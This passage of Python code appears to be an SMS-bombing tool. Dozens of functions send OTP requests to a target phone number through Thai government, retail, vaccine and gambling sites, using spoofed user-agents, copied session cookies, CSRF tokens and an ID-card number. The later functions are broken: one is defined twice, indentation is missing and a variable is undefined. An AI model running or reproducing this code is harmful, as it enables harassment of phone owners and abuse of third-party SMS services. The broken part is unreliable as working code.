	    "referer": "https://id.zilingo.com/login?redirectTo=%2Fth-th%2FWomen%2FClothing&zl_a_si=WCL&up_s=B2B_ASIA_MALL&zl_a_st=category&up_cd=v1_eyJjbGllbnRVc2VySWRlbnRpZmljYXRpb24iOnsiYW5vbnltb3VzVXNlcklkT3B0IjoiQUlENTUwMDY3MTIzMjA0NTY2MDkyIiwic2Vzc2lvbklkT3B0IjoiU0lENTUwMDY3MTIzMjA0NTY2MDkyIiwidXNlcklkT3B0IjpudWxsfSwic2NyZWVuT3B0Ijp7InNjcmVlblR5cGUiOiJDQVRFR09SWSIsInNjcmVlbklkIjoiV0NMIiwic2NvcGUiOm51bGx9LCJidXllclJlZ2lvbk9wdCI6IkIyQl9USEEiLCJsb2NhbGVDb2RlIjoidGgiLCJxdiI6eyJjbGllbnQiOiJXZWIiLCJzdWJDbGllbnQiOiJEZXNrdG9wV2ViIiwidmVyc2lvbiI6IjM1LjguNSJ9fQ%3D%3D&zl_a_pid=SCR-1644292893237-8b21bb69-4f78-4c0d-b828-9f8ff6950507&redirectTo=%2Fth-th%2FWomen%2FClothing&redirectTo=%2Fth-th%2FWomen%2FClothing",
	    "cookie": "_ga=GA1.2.2069144459.1644337535;G_ENABLED_IDPS=google;PLAY_LANG=th;_gid=GA1.2.1262789134.1645627170;_gat_UA-73457576-9=1"
	    }
	requests.post("https://id.zilingo.com/api/v1/userVerification/initiate?up_s=B2B_ASIA_MALL&up_cd=v1_eyJjbGllbnRVc2VySWRlbnRpZmljYXRpb24iOnsiYW5vbnltb3VzVXNlcklkT3B0IjoiQUlENTUwMDY3MTIzMjA0NTY2MDkyIiwic2Vzc2lvbklkT3B0IjoiU0lENTUwMDY3MTIzMjA0NTY2MDkyIiwidXNlcklkT3B0IjpudWxsfSwic2NyZWVuT3B0Ijp7InNjcmVlblR5cGUiOiJDQVRFR09SWSIsInNjcmVlbklkIjoiV0NMIiwic2NvcGUiOm51bGx9LCJidXllclJlZ2lvbk9wdCI6IkIyQl9USEEiLCJsb2NhbGVDb2RlIjoidGgiLCJxdiI6eyJjbGllbnQiOiJXZWIiLCJzdWJDbGllbnQiOiJEZXNrdG9wV2ViIiwidmVyc2lvbiI6IjM1LjguNSJ9fQ==",headers=head,json={"channelDetails":{"phoneNumber":f"+66{phone[1:]}","channelType":"SMS"},"source":"UNIFIED_LOGIN","action":"OTP_LOGIN","redirectTo":"/th-th/Women/Clothing"}).text
	
def api38():
	requests.post("https://tdhw.treasury.go.th/TD-Vote/api/otp/request",json={"ID_CARD":"1104200197909","TEL":f"{phone}","OTP_TYPE":"OTP_TEST"})
	
def api39():
	requests.post("https://user-api.learn.co.th/authentication/sendOTP",json={"mobileNumber": f"{phone}"},headers={"user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","Host": "user-api.learn.co.th","content-length": "29","sec-ch-ua-mobile": "?1","content-type": "application/json;charset=UTF-8","accept": "application/json, text/plain, */*","sec-ch-ua-platform": "Android","origin": "https://user.learn.co.th","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://user.learn.co.th/","x-api-key": "USER_API_KEY"})
	
def api40():
	requests.post("https://cognito-idp.ap-southeast-1.amazonaws.com/",headers={"cache-control": "max-age=0","user-agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","content-type": "application/x-amz-json-1.1","x-amz-target": "AWSCognitoIdentityProviderService.ResendConfirmationCode","x-amz-user-agent": "aws-amplify/0.1.x js","referer": "https://www.bugaboo.tv/members/resetpass/phone"},json={"ClientId":"6g47av6ddfcvi06v4l186c16d6","Username":f"+66{phone[1:]}"})
	
def api41():
	requests.get(f"https://bkk-api.ks-it.co/Vcode/register?country_code=66&phone={phone}&sms_type=1&user_type=2&app_version=4.3.25&device_id=79722530562d973f&app_device_param=%7B%22os%22%3A%22Android%22%2C%22app_version%22%3A%224.3.25%22%2C%22model%22%3A%22A37f%22%2C%22os_ver%22%3A%225.1.1%22%2C%22ble%22%3A%220%22%7D&language=th&token=")
	
def api42():
	requests.post("https://service-api.auto1.co.th/w/user/request-otp-on-register",json={"ConsentFlag":"true","AcceptPolicy":"true","Tel":phone,"OTPId":"","OTP1":"","OTP2":"","OTP3":"","OTP4":"","OTP5":"","OTP6":"","Email":"","Pin1":"","Pin2":"","Pin3":"","Pin4":"","Pin5":"","Pin6":"","PinConfirm1":"","PinConfirm2":"","PinConfirm3":"","PinConfirm4":"","PinConfirm5":"","PinConfirm6":"","FirstName":"","LastName":""},headers={"user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36"})
	
def api43():
	requests.get(f"https://www.konvy.com/ajax/system.php?type=reg&action=get_phone_code&phone={phone}",headers={"user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36"})
	
def api44():
	requests.post("https://vaccine.trueid.net/vacc-verify/api/getotp",json={"msisdn":f"{phone}","function":"enroll"},headers={"user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","cookie": "visid_incap_2104120=FpehtdvzRDuqWIUnbb2obcmSJ2IAAAAAQUIPAAAAAABOfPmHrdd2l1h5JKcTW+MB;tids=bsdi3vf25ea3jinbn8f4r596jpdeqeer;_ga_id=1558776998.1646760667;_gcl_au=1.1.1142664624.1646763274;_ga=GA1.2.1363432684.1646763274;_gid=GA1.2.2042579673.1646763275;_gat_UA-86733131-1=1;_cbclose=1;_cbclose26068=1;_uid26068=B14BC6DC.1;_ctout26068=1;verify=test;_fbp=fb.1.1646763276347.768942143;OptanonAlertBoxClosed=2022-03-08T18:14:39.934Z;OptanonConsent=isIABGlobal=false&datestamp=Wed+Mar+09+2022+01%3A14%3A39+GMT%2B0700+(%E0%B9%80%E0%B8%A7%E0%B8%A5%E0%B8%B2%E0%B8%AD%E0%B8%B4%E0%B8%99%E0%B9%82%E0%B8%94%E0%B8%88%E0%B8%B5%E0%B8%99)&version=6.13.0&hosts=&landingPath=NotLandingPage&groups=C0001%3A1%2CC0002%3A1%2CC0003%3A1%2CC0004%3A1%2CC0005%3A1;_ga_R05PJC3ZG8=GS1.1.1646763273.1.1.1646763285.48"})
	
def api45():
	requests.get("https://findclone.ru/register?phone=+66"+phone)
	
def api46():
	requests.post("https://kaspy.com/sms/sms.php/",data=f"phone={phone}",headers={"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8","User-Agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","Cookie": "PHPSESSID=2i484jdb1pie5am071cveupme5; mage-cache-storage=%7B%7D; mage-cache-storage-section-invalidation=%7B%7D; mage-cache-sessid=true; form_key=rUt4Q17TiRlUfgKz; _ga=GA1.2.1486915122.1646803642; _gid=GA1.2.1348564830.1646803642; _fbp=fb.1.1646803643605.1538052508; mage-messages=; recently_viewed_product=%7B%7D; recently_viewed_product_previous=%7B%7D; recently_compared_product=%7B%7D; recently_compared_product_previous=%7B%7D; product_data_storage=%7B%7D; smartbanner_exited=1; __atuvc=2%7C10; __atuvs=62283aaa77850300001; _gat=1; private_content_version=382c8a313cac3cd587475c1b3693672e; section_data_ids=%7B%22cart%22%3A1646803701%2C%22customer%22%3A1646803701%2C%22compare-products%22%3A1646803701%2C%22last-ordered-items%22%3A1646803701%2C%22directory-data%22%3A1646803701%2C%22captcha%22%3A1646803701%2C%22instant-purchase%22%3A1646803701%2C%22persistent%22%3A1646803701%2C%22review%22%3A1646803701%2C%22wishlist%22%3A1646803701%2C%22chatData%22%3A1646803701%2C%22recently_viewed_product%22%3A1646803701%2C%22recently_compared_product%22%3A1646803701%2C%22product_data_storage%22%3A1646803701%2C%22paypal-billing-agreement%22%3A1646803701%2C%22messages%22%3A1646803708%7D"})
	
def api47():
	r  = ru.Session()
	a = r.get('https://partners-kyc.t2p.co.th/dp-authen/otpReq?lang=th',headers={"user-agent":"Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.87 Mobile Safari/537.36"}).text
	b = bs(a,'html.parser')
	c = b.find("meta",attrs={"name":"csrf-token"})['content']
	d = r.post('https://partners-kyc.t2p.co.th/dp-authen/api/otp',headers={"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8","X-CSRF-TOKEN": c},data=f"tmp=clientStringTmp&cMobileNo={phone}&cMaskMobileNo=090+328+**94").text
	
def api48():
	requests.post("https://ipro356.com/wp-content/themes/hello-elementor/modules/index.php",data=f"method=wpRegisterotp&otp_tel={phone}",headers={"content-type": "application/x-www-form-urlencoded; charset=UTF-8","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","cookie": "PHPSESSID=vtacuje1no166kkp4d40nolak5"})
	
def api49():
	requests.post('https://www.sso.go.th/wpr/MEM/terminal/ajax_send_otp',headers = {"User-Agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","Content-Type": "application/x-www-form-urlencoded; charset=UTF-8","X-Requested-With": "XMLHttpRequest","Cookie": "sso_local_storeci_sessions=KHj9a18RowgHYWbh71T2%2FDFAcuC2%2FQaJkguD3MQ1eh%2FlwrUXvpAjJgrm6QKAja4oe7rglht%2BzO6oqblJ4EMJF4pqnY%2BGtR%2F0RzIFGN0Suh1DJVRCMPpP8QtZsF5yDyw6ibCMf2HXs95LvAMi7KUkIeaWkSahmh5f%2F3%2FqcOQ2OW5yakrMGA1mJ5upBZiUdEYNmxUAljcqrg7P3L%2BGAXxxC2u1bO09Oz4qf4ZV9ShO0gz5p5CbkE7VxIq1KUrEavn9Y%2BarQmsh1qIIc51uvCev1U1uyXfC%2F9U7uRl7x%2FVYZYT2pkLd3Q7qnZoSNBL8y9wge8Lt7grySdVLFhw9HB68dTSiOm1K04QhdrprI7EsTLWDHTgYmgyTQDuz63YjHsH5MUVanlfBISU1WXmRTXMKbUjlcl0LPPYUR9KWzrVL7sXcrCX%2FfUwLJIU%2F7MTtDYUx39y1CAREM%2F8dw7AEjcJAOA%3D%3D684b65b9b9dc33a3380c5b121b6c2b3ecb6f1bec; PHPSESSID=1s2rdo0664qpg4oteil3hhn3v2; TS01ac2b25=01584aa399fbfcc6474d383fdc1405e05eaa529fa33e596e5189664eb7dfefe57b927d8801ad40fba49f0adec4ce717dd5eabf08d7080e2b85f34368a92a47e71ef07861a287c40da15c0688649509d7f97eb2c293; _ga=GA1.3.1824294570.1636876684; _gid=GA1.3.1832635291.1636876684"},data=f"dCard=1358231116147&Mobile={phone}&password=098098Az&repassword=098098Az&perPrefix=Mr.&cn=Dhdhhs&sn=Vssbsh&perBirthday=5&perBirthmonth=5&perBirthyear=2545&Email=nickytom5879%40gmail.com&otp_type=OTP&otpvalue=&messageId=REGISTER")
	
def api50():
	requests.post("https://www.vegas77slots.com/auth/send_otp",data=f"phone={phone}&otp=&password=&bank=&bank_number=&full_name=&ref=21076",headers={"content-type": "application/x-www-form-urlencoded","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","cookie": "vegas77slots=pj5kj4ovnk2fao1sbaid2eb76l1iak7b"})
	
def api51():	
	requests.post("https://topping.truemoveh.com/api/get_request_otp", data=f"mobile_number={phone}",headers={
    "Accept": "application/json, text/plain, /",
    "User-Agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
    "Content-Type": "application/x-www-form-urlencoded",
    "Referer": "https://topping.truemoveh.com/otp?callback=/campaign/104",
    "Cookie": "_ga=GA1.2.1205060554.1640098569; _gcl_au=1.1.1987856152.1640098570; wisepops=%7B%22csd%22%3A1%2C%22popups%22%3A%7B%7D%2C%22sub%22%3A0%2C%22ucrn%22%3A57%2C%22cid%22%3A%2237257%22%2C%22v%22%3A4%2C%22bandit%22%3A%7B%22recos%22%3A%7B%7D%7D%7D; wisepops_props=%7B%22userType%22%3A%22non-true%22%7D; _fbp=fb.1.1640098573194.360235747; wisp-https%3A%2F%2Fapp.getwisp.co-Ly7y=88ce9a24-a734-4ee0-a698-20f8eddb4942; _gac_UA-34289891-14=1.1640601367.Cj0KCQiA5aWOBhDMARIsAIXLlkfb9M64-nkR8u0vdLiqqAhHzV1TK-wuYhvA4nvc76GLMd_LvbDYizMaAruSEALw_wcB; ci_session=dbskqg6a8lqknf9n1cep0jb5vrrhkqdi; AWSELB=87C963610CC5C30592B0F71CAEE836AADF65AFF7868D84BE668BFDE38423D810F8497FAC88813163C52320060AF1A0D59D6D0AECF99D0389471FA83C1B90863201109E903015CCAF2CCBA3F11A5EDD799554400EE1; _gid=GA1.2.1638141276.1641466031; _gac_UA-41231050-25=1.1641466031.Cj0KCQiAw9qOBhC-ARIsAG-rdn5KaPC2N06d1nss7arDQn6S0_lOmvX71l8LKwV__iZpWisXEem-EP8aAjF2EALw_wcB; _gat=1; _gcl_aw=GCL.1641466031.Cj0KCQiAw9qOBhC-ARIsAG-rdn5KaPC2N06d1nss7arDQn6S0_lOmvX71l8LKwV__iZpWisXEem-EP8aAjF2EALw_wcB; _gcl_dc=GCL.1641466031.Cj0KCQiAw9qOBhC-ARIsAG-rdn5KaPC2N06d1nss7arDQn6S0_lOmvX71l8LKwV__iZpWisXEem-EP8aAjF2EALw_wcB; _gat_UA-41231050-25=1; wisepops_visits=%5B%222022-01-06T10%3A47%3A11.626Z%22%2C%222022-01-04T16%3A54%3A03.887Z%22%2C%222021-12-28T10%3A38%3A18.612Z%22%2C%222021-12-28T10%3A38%3A04.394Z%22%2C%222021-12-28T10%3A37%3A40.387Z%22%2C%222021-12-27T03%3A47%3A11.187Z%22%2C%222021-12-25T12%3A27%3A55.196Z%22%2C%222021-12-23T17%3A48%3A39.146Z%22%2C%222021-12-21T17%3A56%3A55.678Z%22%2C%222021-12-21T15%3A06%3A46.971Z%22%5D; wisepops_session=%7B%22arrivalOnSite%22%3A%222022-01-06T10%3A47%3A11.626Z%22%2C%22mtime%22%3A1641466036863%2C%22pageviews%22%3A2%2C%22popups%22%3A%7B%7D%2C%22bars%22%3A%7B%7D%2C%22countdowns%22%3A%7B%7D%2C%22src%22%3A%22https%3A%2F%2Fwww.google.com%2F%22%2C%22utm%22%3A%7B%22gclid%22%3A%22yes%22%7D%2C%22testIp%22%3Anull%7D"})
    
def api52():
	requests.post("https://api.myfave.com/api/fave/v3/auth", headers={"client_id": "dd7a668f74f1479aad9a653412248b62"},json={"phone": "66" + phone})
	
def api53():
	requests.post("https://api2.1112.com/api/v1/otp/create",json={"phonenumber":phone, "language": "th"},headers={"accept": "application/json, text/plain, /", "user-agent": "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"})
	
def api54():
	head = {
		"accept": "application/json, text/plain, */*",
		"content-type": "application/json",
		"user-agent": "Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.73 Mobile Safari/537.36",
		"referer": "https://www.fox888.com/"
		 }
	requests.post("https://lb-api.fox83-sy.xyz/api/otp/register",headers=head,json={"applicant":"0"+phone,"serviceName":"fox888.com"})
		
def api55():
	head = {
	"content-type": "application/json",
	"accept": "*/*",
	"user-agent": "Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.73 Mobile Safari/537.36",
	"referer": "https://salehere.co.th/",
	"cookie": "_fbp=fb.2.1648385201793.1379988974;_gid=GA1.3.1234211865.1648385203;_gat_UA-118968627-9=1;__utma=195884718.1573510301.1648385203.1648385203.1648385203.1;__utmc=195884718;__utmz=195884718.1648385203.1.1.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided);__utmt_%5Bobject%20Object%5D=1;G_ENABLED_IDPS=google;__utmb=195884718.2.10.1648385203;_ga_TQ163J47DR=GS1.1.1648385205.1.0.1648385205.0;_ga=GA1.1.1573510301.1648385203"
	    }
	requests.post("https://api.salehere.co.th/graphql",headers=head,json={"operationName":"sendUserOTPV2","variables":{"tel":phone,"token":""},"extensions":{"persistedQuery":{"version":1,"sha256Hash":"acecc9495b3613d3f076c1588fc5c2fd6fc90dad9a7eaa65f3cef86da88fe68d"}}})
	
def api56():
	requests.post("https://api.freshket.co/baseApi/Users/RequestOtp",headers={"User-Agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","Content-Type": "application/json;charset=UTF-8"},json={"isDev":"false","language":"th","phone":f"+66{phone[1:]}"})
	
def api57():
	requests.post("https://www.theconcert.com/rest/request-otp",headers={"x-xsrf-token": "33ed88f53546803c779ff8c10e7386057YuSCY/kUuCibrt0phirk+ftZp83UlwChfA5qjn8OJy268fFbtZDDu5U3Wc+UMKSLdUFEtf7U4rRzuy2rvmK+LFcY5y5N6eextOHy53Eg9zuedQdkV0DSRIKKo4q0CBA","x-csrf-token": "ai49Zub4-IsdrbJwOTXdL5bZy1RU2QvpHSPc","cookie": "_gcl_au=1.1.1502258808.1656237331;_fbp=fb.1.1656237331957.603057766;__gads=ID=eb23ce56d1c7de3e-22e38929c0d40031:T=1656237332:RT=1656237332:S=ALNI_MZC9-jiB6phkTi6InD_2HFqsf7dTA;lang=th;pagesInSession=1;__gpi=UID=00000633fd49bde3:T=1656237332:RT=1656415272:S=ALNI_MZJBTJ3y6ilUC3xgp70URp3GC1PEg;_ga_N9T2LF0PJ1=GS1.1.1656415272.2.0.1656415272.0;_ga=GA1.2.543101815.1656237332;_gid=GA1.2.846940337.1656415273;_gat_UA-133219660-2=1;popup_1436=true;adonis-session=95ad0fa91d1d2f313006a0e2b0ef4a55VMCjUjHXUP5Z7dIt9yj0ikjCYKp6h2Y%2B0opJ%2FIEkK1igD11Zq3PhMqfGOSfG3%2F5R5C%2FLCKcoaEYy14g4HXhfjwGl5eOP1MZpX99v3PE75RD8GTZOTSvxcNvhvTTGYHI7;XSRF-TOKEN=33ed88f53546803c779ff8c10e7386057YuSCY%2FkUuCibrt0phirk%2BftZp83UlwChfA5qjn8OJy268fFbtZDDu5U3Wc%2BUMKSLdUFEtf7U4rRzuy2rvmK%2BLFcY5y5N6eextOHy53Eg9zuedQdkV0DSRIKKo4q0CBA","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","content-type": "application/json;charset=UTF-8"},json={"mobile":phone,"country_code":"TH","lang":"th","channel":"sms","digit":4})
	
def api58():
	requests.post("https://api.salehere.co.th/graphql",headers=head,json={"operationName":"sendUserOTPV2","variables":{"tel":phone,"token":""},"extensions":{"persistedQuery":{"version":1,"sha256Hash":"acecc9495b3613d3f076c1588fc5c2fd6fc90dad9a7eaa65f3cef86da88fe68d"}}})


def api59():
requests.post("https://www.theconcert.com/rest/request-otp",headers={"x-xsrf-token": "33ed88f53546803c779ff8c10e7386057YuSCY/kUuCibrt0phirk+ftZp83UlwChfA5qjn8OJy268fFbtZDDu5U3Wc+UMKSLdUFEtf7U4rRzuy2rvmK+LFcY5y5N6eextOHy53Eg9zuedQdkV0DSRIKKo4q0CBA","x-csrf-token": "ai49Zub4-IsdrbJwOTXdL5bZy1RU2QvpHSPc","cookie": "_gcl_au=1.1.1502258808.1656237331;_fbp=fb.1.1656237331957.603057766;__gads=ID=eb23ce56d1c7de3e-22e38929c0d40031:T=1656237332:RT=1656237332:S=ALNI_MZC9-jiB6phkTi6InD_2HFqsf7dTA;lang=th;pagesInSession=1;__gpi=UID=00000633fd49bde3:T=1656237332:RT=1656415272:S=ALNI_MZJBTJ3y6ilUC3xgp70URp3GC1PEg;_ga_N9T2LF0PJ1=GS1.1.1656415272.2.0.1656415272.0;_ga=GA1.2.543101815.1656237332;_gid=GA1.2.846940337.1656415273;_gat_UA-133219660-2=1;popup_1436=true;adonis-session=95ad0fa91d1d2f313006a0e2b0ef4a55VMCjUjHXUP5Z7dIt9yj0ikjCYKp6h2Y%2B0opJ%2FIEkK1igD11Zq3PhMqfGOSfG3%2F5R5C%2FLCKcoaEYy14g4HXhfjwGl5eOP1MZpX99v3PE75RD8GTZOTSvxcNvhvTTGYHI7;XSRF-TOKEN=33ed88f53546803c779ff8c10e7386057YuSCY%2FkUuCibrt0phirk%2BftZp83UlwChfA5qjn8OJy268fFbtZDDu5U3Wc%2BUMKSLdUFEtf7U4rRzuy2rvmK%2BLFcY5y5N6eextOHy53Eg9zuedQdkV0DSRIKKo4q0CBA","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","content-type": "application/json;charset=UTF-8"},json={"mobile":phone,"country_code":"TH","lang":"th","channel":"sms","digit":4})

def api59():
requests.post("https://www.theconcert.com/rest/request-otp",headers={"x-xsrf-token": "33ed88f53546803c779ff8c10e7386057YuSCY/kUuCibrt0phirk+ftZp83UlwChfA5qjn8OJy268fFbtZDDu5U3Wc+UMKSLdUFEtf7U4rRzuy2rvmK+LFcY5y5N6eextOHy53Eg9zuedQdkV0DSRIKKo4q0CBA","x-csrf-token": "ai49Zub4-IsdrbJwOTXdL5bZy1RU2QvpHSPc","cookie": "_gcl_au=1.1.1502258808.1656237331;_fbp=fb.1.1656237331957.603057766;__gads=ID=eb23ce56d1c7de3e-22e38929c0d40031:T=1656237332:RT=1656237332:S=ALNI_MZC9-jiB6phkTi6InD_2HFqsf7dTA;lang=th;pagesInSession=1;__gpi=UID=00000633fd49bde3:T=1656237332:RT=1656415272:S=ALNI_MZJBTJ3y6ilUC3xgp70URp3GC1PEg;_ga_N9T2LF0PJ1=GS1.1.1656415272.2.0.1656415272.0;_ga=GA1.2.543101815.1656237332;_gid=GA1.2.846940337.1656415273;_gat_UA-133219660-2=1;popup_1436=true;adonis-session=95ad0fa91d1d2f313006a0e2b0ef4a55VMCjUjHXUP5Z7dIt9yj0ikjCYKp6h2Y%2B0opJ%2FIEkK1igD11Zq3PhMqfGOSfG3%2F5R5C%2FLCKcoaEYy14g4HXhfjwGl5eOP1MZpX99v3PE75RD8GTZOTSvxcNvhvTTGYHI7;XSRF-TOKEN=33ed88f53546803c779ff8c10e7386057YuSCY%2FkUuCibrt0phirk%2BftZp83UlwChfA5qjn8OJy268fFbtZDDu5U3Wc%2BUMKSLdUFEtf7U4rRzuy2rvmK%2BLFcY5y5N6eextOHy53Eg9zuedQdkV0DSRIKKo4q0CBA","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","content-type": "application/json;charset=UTF-8"},json={"mobile":phone,"country_code":"TH","lang":"th","channel":"sms","digit":4})

def api60():
head = {
	"content-type": "application/json",
	"accept": "*/*",
	"user-agent": "Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.73 Mobile Safari/537.36",
	"referer": "https://salehere.co.th/",
	"cookie": "_fbp=fb.2.1648385201793.1379988974;_gid=GA1.3.1234211865.1648385203;_gat_UA-118968627-9=1;__utma=195884718.1573510301.1648385203.1648385203.1648385203.1;__utmc=195884718;__utmz=195884718.1648385203.1.1.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided);__utmt_%5Bobject%20Object%5D=1;G_ENABLED_IDPS=google;__utmb=195884718.2.10.1648385203;_ga_TQ163J47DR=GS1.1.1648385205.1.0.1648385205.0;_ga=GA1.1.1573510301.1648385203"
	    }
	requests.post("https://api.salehere.co.th/graphql",headers=head,json={"operationName":"sendUserOTPV2","variables":{"tel":phone,"token":""},"extensions":{"persistedQuery":{"version":1,"sha256Hash":"acecc9495b3613d3f076c1588fc5c2fd6fc90dad9a7eaa65f3cef86da88fe68d"}}})

def api61():
requests.post("https://www.theconcert.com/rest/request-otp",headers={"x-xsrf-token": "33ed88f53546803c779ff8c10e7386057YuSCY/kUuCibrt0phirk+ftZp83UlwChfA5qjn8OJy268fFbtZDDu5U3Wc+UMKSLdUFEtf7U4rRzuy2rvmK+LFcY5y5N6eextOHy53Eg9zuedQdkV0DSRIKKo4q0CBA","x-csrf-token": "ai49Zub4-IsdrbJwOTXdL5bZy1RU2QvpHSPc","cookie": "_gcl_au=1.1.1502258808.1656237331;_fbp=fb.1.1656237331957.603057766;__gads=ID=eb23ce56d1c7de3e-22e38929c0d40031:T=1656237332:RT=1656237332:S=ALNI_MZC9-jiB6phkTi6InD_2HFqsf7dTA;lang=th;pagesInSession=1;__gpi=UID=00000633fd49bde3:T=1656237332:RT=1656415272:S=ALNI_MZJBTJ3y6ilUC3xgp70URp3GC1PEg;_ga_N9T2LF0PJ1=GS1.1.1656415272.2.0.1656415272.0;_ga=GA1.2.543101815.1656237332;_gid=GA1.2.846940337.1656415273;_gat_UA-133219660-2=1;popup_1436=true;adonis-session=95ad0fa91d1d2f313006a0e2b0ef4a55VMCjUjHXUP5Z7dIt9yj0ikjCYKp6h2Y%2B0opJ%2FIEkK1igD11Zq3PhMqfGOSfG3%2F5R5C%2FLCKcoaEYy14g4HXhfjwGl5eOP1MZpX99v3PE75RD8GTZOTSvxcNvhvTTGYHI7;XSRF-TOKEN=33ed88f53546803c779ff8c10e7386057YuSCY%2FkUuCibrt0phirk%2BftZp83UlwChfA5qjn8OJy268fFbtZDDu5U3Wc%2BUMKSLdUFEtf7U4rRzuy2rvmK%2BLFcY5y5N6eextOHy53Eg9zuedQdkV0DSRIKKo4q0CBA","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","content-type": "application/json;charset=UTF-8"},json={"mobile":phone,"country_code":"TH","lang":"th","channel":"sms","digit":4})

def api62():
requests.post("https://www.theconcert.com/rest/request-otp",headers={"x-xsrf-token": "33ed88f53546803c779ff8c10e7386057YuSCY/kUuCibrt0phirk+ftZp83UlwChfA5qjn8OJy268fFbtZDDu5U3Wc+UMKSLdUFEtf7U4rRzuy2rvmK+LFcY5y5N6eextOHy53Eg9zuedQdkV0DSRIKKo4q0CBA","x-csrf-token": "ai49Zub4-IsdrbJwOTXdL5bZy1RU2QvpHSPc","cookie": "_gcl_au=1.1.1502258808.1656237331;_fbp=fb.1.1656237331957.603057766;__gads=ID=eb23ce56d1c7de3e-22e38929c0d40031:T=1656237332:RT=1656237332:S=ALNI_MZC9-jiB6phkTi6InD_2HFqsf7dTA;lang=th;pagesInSession=1;__gpi=UID=00000633fd49bde3:T=1656237332:RT=1656415272:S=ALNI_MZJBTJ3y6ilUC3xgp70URp3GC1PEg;_ga_N9T2LF0PJ1=GS1.1.1656415272.2.0.1656415272.0;_ga=GA1.2.543101815.1656237332;_gid=GA1.2.846940337.1656415273;_gat_UA-133219660-2=1;popup_1436=true;adonis-session=95ad0fa91d1d2f313006a0e2b0ef4a55VMCjUjHXUP5Z7dIt9yj0ikjCYKp6h2Y%2B0opJ%2FIEkK1igD11Zq3PhMqfGOSfG3%2F5R5C%2FLCKcoaEYy14g4HXhfjwGl5eOP1MZpX99v3PE75RD8GTZOTSvxcNvhvTTGYHI7;XSRF-TOKEN=33ed88f53546803c779ff8c10e7386057YuSCY%2FkUuCibrt0phirk%2BftZp83UlwChfA5qjn8OJy268fFbtZDDu5U3Wc%2BUMKSLdUFEtf7U4rRzuy2rvmK%2BLFcY5y5N6eextOHy53Eg9zuedQdkV0DSRIKKo4q0CBA","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","content-type": "application/json;charset=UTF-8"},json={"mobile":phone,"country_code":"TH","lang":"th","channel":"sms","digit":4})

def api63():
head = {
	"content-type": "application/json",
	"accept": "*/*",
	"user-agent": "Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.73 Mobile Safari/537.36",
	"referer": "https://salehere.co.th/",
	"cookie": "_fbp=fb.2.1648385201793.1379988974;_gid=GA1.3.1234211865.1648385203;_gat_UA-118968627-9=1;__utma=195884718.1573510301.1648385203.1648385203.1648385203.1;__utmc=195884718;__utmz=195884718.1648385203.1.1.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided);__utmt_%5Bobject%20Object%5D=1;G_ENABLED_IDPS=google;__utmb=195884718.2.10.1648385203;_ga_TQ163J47DR=GS1.1.1648385205.1.0.1648385205.0;_ga=GA1.1.1573510301.1648385203"
	    }
